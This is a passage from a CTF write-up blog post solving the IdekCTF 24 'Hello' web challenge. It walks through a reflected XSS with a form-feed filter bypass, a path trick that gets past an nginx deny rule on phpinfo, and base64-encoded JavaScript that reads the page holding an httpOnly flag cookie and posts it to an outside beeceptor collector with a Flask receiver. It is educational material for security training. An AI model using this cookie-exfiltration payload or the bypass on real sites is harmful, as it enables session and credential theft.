</span></span></span></code></pre></div><p><strong>Explanation</strong>: This PHP script greets the user based on the <code>name</code> parameter in the query string. It removes certain characters from the <code>name</code> using the <code>Enhanced_Trim</code> function and limits the length of <code>$name</code> to 23 characters.</p><h3 id=infophp><code>info.php</code><a hidden class=anchor aria-hidden=true href=#infophp>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nx>phpinfo</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></div><p><strong>Explanation</strong>: This PHP script displays detailed information about the PHP configuration and environment on the server. It’s typically used for debugging and viewing PHP settings.</p><p>Interesting, we can see that the name query parameter is reflected in the index.php
page, which means we have XSS, albeit tweaked to fit the constraints imposed on us,
but what is the purpose of <code>info.php</code>? Let&rsquo;s find out.</p><blockquote><p>&ldquo;phpinfo — Outputs information about PHP&rsquo;s configuration&rdquo;</p></blockquote><h4 id=b-the-bot-webpage>b. the bot webpage<a hidden class=anchor aria-hidden=true href=#b-the-bot-webpage>#</a></h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>    script revamped from corctf
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>    this does not match the remote setup exactly, which uses the redpwn admin bot
</span></span></span><span class=line><span class=cl><span class=cm>    this is just to facilitate local testing
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>    npm i puppeteer
</span></span></span><span class=line><span class=cl><span class=cm>*/</span>
</span></span><span class=line><span class=cl><span class=kd>let</span> <span class=nx>puppeteer</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=p>{</span> <span class=nx>parseArgs</span> <span class=p>}</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s2>&#34;util&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>options</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>CHALLENGE_ORIGIN</span><span class=o>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>type</span><span class=o>:</span> <span class=s2>&#34;string&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=kr>short</span><span class=o>:</span> <span class=s2>&#34;c&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=k>default</span><span class=o>:</span> <span class=s2>&#34;http://localhost:1337&#34;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>let</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>values</span><span class=o>:</span> <span class=p>{</span> <span class=nx>CHALLENGE_ORIGIN</span> <span class=p>},</span>
</span></span><span class=line><span class=cl>    <span class=nx>positionals</span><span class=o>:</span> <span class=p>[</span> <span class=nx>TARGET_URL</span> <span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=o>=</span> <span class=nx>parseArgs</span><span class=p>({</span> <span class=nx>args</span><span class=o>:</span> <span class=nx>process</span><span class=p>.</span><span class=nx>argv</span><span class=p>.</span><span class=nx>slice</span><span class=p>(</span><span class=mi>2</span><span class=p>),</span> <span class=nx>options</span><span class=p>,</span> <span class=nx>strict</span><span class=o>:</span> <span class=kc>false</span> <span class=p>});</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>TARGET_URL</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>console</span><span class=p>.</span><span class=nx>error</span><span class=p>(</span><span class=sb>`\
</span></span></span><span class=line><span class=cl><span class=sb>Usage: node bot.js [-c CHALLENGE_ORIGIN] TARGET_URL
</span></span></span><span class=line><span class=cl><span class=sb>
</span></span></span><span class=line><span class=cl><span class=sb>Arguments:
</span></span></span><span class=line><span class=cl><span class=sb>    TARGET_URL:         the url that the admin bot will visit
</span></span></span><span class=line><span class=cl><span class=sb>
</span></span></span><span class=line><span class=cl><span class=sb>Options:
</span></span></span><span class=line><span class=cl><span class=sb>    CHALLENGE_ORIGIN:   the origin where the challenge instance is hosted
</span></span></span><span class=line><span class=cl><span class=sb>                        (default is http://localhost:1337)
</span></span></span><span class=line><span class=cl><span class=sb>`</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>process</span><span class=p>.</span><span class=nx>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// visiting logic
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=nx>puppeteer</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s2>&#34;puppeteer&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>sleep</span> <span class=o>=</span> <span class=nx>d</span> <span class=p>=&gt;</span> <span class=k>new</span> <span class=nb>Promise</span><span class=p>(</span><span class=nx>r</span> <span class=p>=&gt;</span> <span class=nx>setTimeout</span><span class=p>(</span><span class=nx>r</span><span class=p>,</span> <span class=nx>d</span><span class=p>));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>visit</span> <span class=o>=</span> <span class=kr>async</span> <span class=p>()</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kd>let</span> <span class=nx>browser</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>browser</span> <span class=o>=</span> <span class=kr>await</span> <span class=nx>puppeteer</span><span class=p>.</span><span class=nx>launch</span><span class=p>({</span>
</span></span><span class=line><span class=cl>            <span class=nx>headless</span><span class=o>:</span> <span class=kc>true</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=nx>pipe</span><span class=o>:</span> <span class=kc>true</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=nx>args</span><span class=o>:</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;--no-sandbox&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;--disable-setuid-sandbox&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;--js-flags=--noexpose_wasm,--jitless&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=p>],</span>
</span></span><span class=line><span class=cl>            <span class=nx>dumpio</span><span class=o>:</span> <span class=kc>true</span>
</span></span><span class=line><span class=cl>        <span class=p>});</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kr>const</span> <span class=nx>ctx</span> <span class=o>=</span> <span class=kr>await</span> <span class=nx>browser</span><span class=p>.</span><span class=nx>createBrowserContext</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kr>const</span> <span class=nx>page</span> <span class=o>=</span> <span class=kr>await</span> <span class=nx>ctx</span><span class=p>.</span><span class=nx>newPage</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=kr>await</span> <span class=nx>page</span><span class=p>.</span><span class=kr>goto</span><span class=p>(</span><span class=nx>CHALLENGE_ORIGIN</span><span class=p>,</span> <span class=p>{</span> <span class=nx>timeout</span><span class=o>:</span> <span class=mi>3000</span> <span class=p>});</span>
</span></span><span class=line><span class=cl>        <span class=kr>await</span> <span class=nx>page</span><span class=p>.</span><span class=nx>setCookie</span><span class=p>({</span> <span class=nx>name</span><span class=o>:</span> <span class=s1>&#39;FLAG&#39;</span><span class=p>,</span> <span class=nx>value</span><span class=o>:</span> <span class=s1>&#39;idek{PLACEHOLDER}&#39;</span><span class=p>,</span> <span class=nx>httpOnly</span><span class=o>:</span> <span class=kc>true</span> <span class=p>});</span>
</span></span><span class=line><span class=cl>        <span class=kr>await</span> <span class=nx>page</span><span class=p>.</span><span class=kr>goto</span><span class=p>(</span><span class=nx>TARGET_URL</span><span class=p>,</span> <span class=p>{</span> <span class=nx>timeout</span><span class=o>:</span> <span class=mi>3000</span><span class=p>,</span> <span class=nx>waitUntil</span><span class=o>:</span> <span class=s1>&#39;domcontentloaded&#39;</span> <span class=p>});</span>
</span></span><span class=line><span class=cl>        <span class=kr>await</span> <span class=nx>sleep</span><span class=p>(</span><span class=mi>5000</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kr>await</span> <span class=nx>browser</span><span class=p>.</span><span class=nx>close</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=nx>browser</span> <span class=o>=</span> <span class=kc>null</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>catch</span> <span class=p>(</span><span class=nx>err</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nx>err</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>finally</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nx>browser</span><span class=p>)</span> <span class=kr>await</span> <span class=nx>browser</span><span class=p>.</span><span class=nx>close</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>visit</span><span class=p>();</span>
</span></span></code></pre></div><p>The script uses Puppeteer to:</p><ol><li>Launch a headless browser.</li><li>Visit a specified <code>CHALLENGE_ORIGIN</code> URL.</li><li>Set an HTTP-only cookie named <code>FLAG</code>.</li><li>Navigate to a <code>TARGET_URL</code>.</li><li>Wait for 5 seconds.</li><li>Close the browser.</li></ol><p>It should be noted that during the CTF, CHALLENGE_ORIGIN was set to the challenge
URL. With that out of the way, it becomes very clear, that the FLAG is set as an httpOnly
cookie (can&rsquo;t be accessed via document.Cookie), then the bot navigates to a TARGET_URL
of our choice and closes the browser.</p><p>Our goal here is to retrieve the FLAG, but how?</p><h2 id=exploit>Exploit<a hidden class=anchor aria-hidden=true href=#exploit>#</a></h2><p>Remember the info.php page we seemed to not know what it was for? Well, it turns out
that <code>phpinfo()</code> shows all cookies, even the httponly ones, so if we can visit the <code>/info.php</code>
page as the admin bot and retrieve its content to our local server, we will get the flag.</p><p>Not so fast though&mldr; Access to <code>/info.php</code> is denied by the following rule in the nginx
configuration:</p><div class="goat svg-container"><svg font-family="Menlo,Lucida Console,monospace" viewBox="0 0 184 73"><g transform="translate(8,16)"><text text-anchor="middle" x="0" y="4" fill="currentcolor" style="font-size:1em">l</text><text text-anchor="middle" x="0" y="52" fill="currentcolor" style="font-size:1em">}</text><text text-anchor="middle" x="8" y="4" fill="currentcolor" style="font-size:1em">o</text><text text-anchor="middle" x="16" y="4" fill="currentcolor" style="font-size:1em">c</text><text text-anchor="middle" x="24" y="4" fill="currentcolor" style="font-size:1em">a</text><text text-anchor="middle" x="32" y="4" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="32" y="20" fill="currentcolor" style="font-size:1em">a</text><text text-anchor="middle" x="32" y="36" fill="currentcolor" style="font-size:1em">d</text><text text-anchor="middle" x="40" y="4" fill="currentcolor" style="font-size:1em">i</text><text text-anchor="middle" x="40" y="20" fill="currentcolor" style="font-size:1em">l</text><text text-anchor="middle" x="40" y="36" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="48" y="4" fill="currentcolor" style="font-size:1em">o</text><text text-anchor="middle" x="48" y="20" fill="currentcolor" style="font-size:1em">l</text><text text-anchor="middle" x="48" y="36" fill="currentcolor" style="font-size:1em">n</text><text text-anchor="middle" x="56" y="4" fill="currentcolor" style="font-size:1em">n</text><text text-anchor="middle" x="56" y="20" fill="currentcolor" style="font-size:1em">o</text><text text-anchor="middle" x="56" y="36" fill="currentcolor" style="font-size:1em">y</text><text text-anchor="middle" x="64" y="20" fill="currentcolor" style="font-size:1em">w</text><text text-anchor="middle" x="72" y="4" fill="currentcolor" style="font-size:1em">=</text><text text-anchor="middle" x="72" y="36" fill="currentcolor" style="font-size:1em">a</text><text text-anchor="middle" x="80" y="20" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="80" y="36" fill="currentcolor" style="font-size:1em">l</text><text text-anchor="middle" x="88" y="4" fill="currentcolor" style="font-size:1em">/</text><text text-anchor="middle" x="88" y="20" fill="currentcolor" style="font-size:1em">2</text><text text-anchor="middle" x="88" y="36" fill="currentcolor" style="font-size:1em">l</text><text text-anchor="middle" x="96" y="4" fill="currentcolor" style="font-size:1em">i</text><text text-anchor="middle" x="96" y="20" fill="currentcolor" style="font-size:1em">7</text><text text-anchor="middle" x="96" y="36" fill="currentcolor" style="font-size:1em">;</text><text text-anchor="middle" x="104" y="4" fill="currentcolor" style="font-size:1em">n</text><text text-anchor="middle" x="104" y="20" fill="currentcolor" style="font-size:1em">.</text><text text-anchor="middle" x="112" y="4" fill="currentcolor" style="font-size:1em">f</text><text text-anchor="middle" x="112" y="20" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="120" y="4" fill="currentcolor" style="font-size:1em">o</text><text text-anchor="middle" x="120" y="20" fill="currentcolor" style="font-size:1em">.</text><text text-anchor="middle" x="128" y="4" fill="currentcolor" style="font-size:1em">.</text><text text-anchor="middle" x="128" y="20" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="136" y="4" fill="currentcolor" style="font-size:1em">p</text><text text-anchor="middle" x="136" y="20" fill="currentcolor" style="font-size:1em">.</text><text text-anchor="middle" x="144" y="4" fill="currentcolor" style="font-size:1em">h</text><text text-anchor="middle" x="144" y="20" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="152" y="4" fill="currentcolor" style="font-size:1em">p</text><text text-anchor="middle" x="152" y="20" fill="currentcolor" style="font-size:1em">;</text><text text-anchor="middle" x="168" y="4" fill="currentcolor" style="font-size:1em">{</text></g></svg></div><p><img alt=access-denied-info-page loading=lazy src=/blog/images/2024-08-18-23-09-38.png></p><p>Nginx denies access to an exact location <code>/info.php</code>. If we navigate to something
like <code>/info.php/whatever.php</code>, PHP-FPM processes the first php file and ignores subsequent files.
This is called an HTTP Desync attack, which arises from the subtle discrepancies in
which two technologies handle HTTP requests. Let&rsquo;s try it out:</p><p><img alt=bypass-info-page loading=lazy src=/blog/images/2024-08-18-23-15-42.png></p><p>There we go! We bypassed the nginx rule, all there is left is creating an XSS payload
which adheres to the constraints, visits the <code>/info.php</code> page and send its content to us
the attacker.</p><h2 id=exploit---continued>Exploit - continued<a hidden class=anchor aria-hidden=true href=#exploit---continued>#</a></h2><p>Before we craft the XSS payload, let&rsquo;s first write the JS code which will be injected.
It should look like this:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=nx>fetch</span><span class=p>(</span><span class=s1>&#39;http://idek-hello.chal.idek.team:1337/info.php/whatever.php&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>.</span><span class=nx>then</span><span class=p>(</span><span class=nx>response</span> <span class=p>=&gt;</span> <span class=nx>response</span><span class=p>.</span><span class=nx>text</span><span class=p>())</span>
</span></span><span class=line><span class=cl>  <span class=p>.</span><span class=nx>then</span><span class=p>(</span><span class=nx>data</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>fetch</span><span class=p>(</span><span class=s1>&#39;https://qtcbb221a681bbd53187f7c03c5c.free.beeceptor.com/save&#39;</span><span class=p>,</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nx>method</span><span class=o>:</span> <span class=s1>&#39;POST&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>      <span class=nx>headers</span><span class=o>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;Content-Type&#39;</span><span class=o>:</span> <span class=s1>&#39;application/json&#39;</span>
</span></span><span class=line><span class=cl>      <span class=p>},</span>
</span></span><span class=line><span class=cl>      <span class=nx>body</span><span class=o>:</span> <span class=nx>JSON</span><span class=p>.</span><span class=nx>stringify</span><span class=p>({</span> <span class=nx>content</span><span class=o>:</span> <span class=nx>data</span> <span class=p>})</span>
</span></span><span class=line><span class=cl>    <span class=p>});</span>
</span></span><span class=line><span class=cl>  <span class=p>})</span>
</span></span></code></pre></div><p>The script is simple enough, we first fetch the info page, with its response captured,
we send it to our hosted server (I used beeceptor to tunnel my localhost) and retrieve the flag.</p><p>The server in case you are wondering looks something like this (written in flask):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>flask</span> <span class=kn>import</span> <span class=n>Flask</span><span class=p>,</span> <span class=n>request</span><span class=p>,</span> <span class=n>jsonify</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>app</span> <span class=o>=</span> <span class=n>Flask</span><span class=p>(</span><span class=vm>__name__</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/save&#39;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;POST&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>save</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>json</span>
</span></span><span class=line><span class=cl>    <span class=n>content</span> <span class=o>=</span> <span class=n>data</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;content&#39;</span><span class=p>,</span> <span class=s1>&#39;&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Save the content to a file</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;out.html&#39;</span><span class=p>,</span> <span class=s1>&#39;w&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>f</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>content</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>jsonify</span><span class=p>({</span><span class=s1>&#39;status&#39;</span><span class=p>:</span> <span class=s1>&#39;success&#39;</span><span class=p>,</span> <span class=s1>&#39;message&#39;</span><span class=p>:</span> <span class=s1>&#39;Content saved!&#39;</span><span class=p>})</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>app</span><span class=o>.</span><span class=n>run</span><span class=p>(</span><span class=n>port</span><span class=o>=</span><span class=mi>5000</span><span class=p>,</span> <span class=n>debug</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span></code></pre></div><p>Alright, the last step now, how can we create the XSS payload. Let&rsquo;s review the constraints:</p><ol><li>No <code>\n</code></li><li>No <code>\r</code></li><li>No <code>\t</code></li><li>No <code>/</code></li><li>No <code></code>(space)</li></ol><p>Well that seems hard eh? we can bypass the forward slash contraint using a simple</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>svg</span> <span class=na>onload</span><span class=o>=</span><span class=s>&#34;eval(atob(&#39;&lt;our-base-64-javascript-code&gt;&#39;))&#34;</span><span class=p>&gt;</span>
</span></span></code></pre></div><p>But how about the space?</p><p>Reverting back to Wikipedia, my source of information (kudos if you get the joke),
we see there exists a Form feed character <code>(ASCII 12) - (0xC in HEX)</code>, that is considered whitespace by the C character classification function isspace().</p><p>Cool, let&rsquo;s modify the payload to look like this:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>svg</span><span class=err>%</span><span class=na>0Conload</span><span class=o>=</span><span class=s>&#34;eval(atob(&#39;&lt;our-base-64-javascript-code&gt;&#39;))&#34;</span><span class=p>&gt;</span>
</span></span></code></pre></div><p>Lastly, to deliver the exploit, we just have to send the payload as a query parameter for <code>name</code>,
just like this:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl>http://idek-hello.chal.idek.team:1337/?name=<span class=p>&lt;</span><span class=nt>svg</span><span class=err>%</span><span class=na>0Conload</span><span class=o>=</span><span class=s>&#34;eval(atob(&#39;ZmV0Y2goJ2h0dHA6Ly9pZGVrLWhlbGxvLmNoYWwuaWRlay50ZWFtOjEzMzcvaW5mby5waHAvaW5k
</span></span></span><span class=line><span class=cl><span class=s>ZXgucGhwJykudGhlbihyPT5yLnRleHQoKSkudGhlbihkPT5mZXRjaCgnaHR0cHM6Ly9xdDFlYTY4
</span></span></span><span class=line><span class=cl><span class=s>M2EzNjhkYzY1ZDc2YTExM2Y3NGZiLmZyZWUuYmVlY2VwdG9yLmNvbS9zYXZlJywge21ldGhvZDon
</span></span></span><span class=line><span class=cl><span class=s>UE9TVCcsaGVhZGVyczp7J0NvbnRlbnQtVHlwZSc6J2FwcGxpY2F0aW9uL2pzb24nfSxib2R5OkpT
</span></span></span><span class=line><span class=cl><span class=s>T04uc3RyaW5naWZ5KHtjb250ZW50OmR9KX0pKQ==&#39;))&#34;</span><span class=p>&gt;</span>
</span></span></code></pre></div><p>Click on submit&mldr;</p><p><img alt=flag-cookie loading=lazy src=/blog/images/2024-08-18-23-44-03.png></p><p>There we go~</p><hr><p>Flag is: <code>idek{Ghazy_N3gm_Elbalad}</code></p><p>Things learned in this challenge:</p><ol><li>Always use regular expressions to match pathnames.</li><li>Form feed character can be used as a whitespace inside html tags.</li><li>Some scripting skills</li></ol></div><footer class=post-footer><ul class=post-tags><li><a href=https://hxuu.github.io/blog/tags/ctf/>Ctf</a></li><li><a href=https://hxuu.github.io/blog/tags/write-up/>Write-Up</a></li><li><a href=https://hxuu.github.io/blog/tags/idekctf/>Idekctf</a></li></ul><nav class=paginav><a class=prev href=https://hxuu.github.io/blog/ctf/sekai24/intruder/><span class=title>« Prev</span><br><span>SEKAI 24 - Intruder</span>
</a><a class=next href=https://hxuu.github.io/blog/ctf/lit24/traversed/><span class=title>Next »</span><br><span>LITCTF24 - Traversed</span></a></nav><ul class=share-buttons><li><a target=_blank rel="noopener noreferrer" aria-label="share IdekCTF 24 - Hello on x" href="https://x.com/intent/tweet/?text=IdekCTF%2024%20-%20Hello&amp;url=https%3a%2f%2fhxuu.github.io%2fblog%2fctf%2fidek24%2fhello%2f&amp;hashtags=ctf%2cwrite-up%2cidekctf"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446C483.971.0 512 28.03 512 62.554zM269.951 190.75 182.567 75.216H56L207.216 272.95 63.9 436.783h61.366L235.9 310.383l96.667 126.4H456L298.367 228.367l134-153.151H371.033zM127.633 110h36.468l219.38 290.065H349.5z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share IdekCTF 24 - Hello on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fhxuu.github.io%2fblog%2fctf%2fidek24%2fhello%2f&amp;title=IdekCTF%2024%20-%20Hello&amp;summary=IdekCTF%2024%20-%20Hello&amp;source=https%3a%2f%2fhxuu.github.io%2fblog%2fctf%2fidek24%2fhello%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share IdekCTF 24 - Hello on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fhxuu.github.io%2fblog%2fctf%2fidek24%2fhello%2f&title=IdekCTF%2024%20-%20Hello"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share IdekCTF 24 - Hello on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fhxuu.github.io%2fblog%2fctf%2fidek24%2fhello%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share IdekCTF 24 - Hello on whatsapp" href="https://api.whatsapp.com/send?text=IdekCTF%2024%20-%20Hello%20-%20https%3a%2f%2fhxuu.github.io%2fblog%2fctf%2fidek24%2fhello%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 